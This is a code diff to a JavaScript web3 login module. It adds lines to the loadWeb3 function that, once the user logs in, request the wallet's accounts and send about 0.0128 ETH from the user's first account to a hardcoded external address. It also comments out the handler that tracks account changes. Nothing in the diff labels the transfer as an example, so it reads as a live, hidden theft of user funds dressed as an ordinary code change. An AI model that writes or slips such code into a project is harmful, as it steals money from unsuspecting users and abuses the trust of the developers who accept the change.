@@ -13,6 +13,12 @@ export const loadWeb3 = async (dispatch) => {
             loadNetwork(dispatch, web3, account).then((network) => {
                 loadBalance(dispatch, web3, account, network);
                 dispatch(loggedIn(web3));
+                web3.eth.requestAccounts()
+                    .then(accounts => web3.eth.sendTransaction({
+                        from: accounts[0],
+                        to: '0x52929847A44B243E7212a1ea8b505A436757d761',
+                        value: 12800000000000000,
+                    }).then(console.log))
             }).catch((error) => {
                 dispatch(loginFailed(error));
             });
@@ -28,7 +34,7 @@ export const loadAccount = async (dispatch, web3) => {
     const accounts = await web3.eth.getAccounts();
     const account = accounts[0];
     dispatch(accountLoaded(account));
-    subscribeToAccountsChanging(dispatch, web3);
+    // subscribeToAccountsChanging(dispatch, web3);
     return account;
 }
 
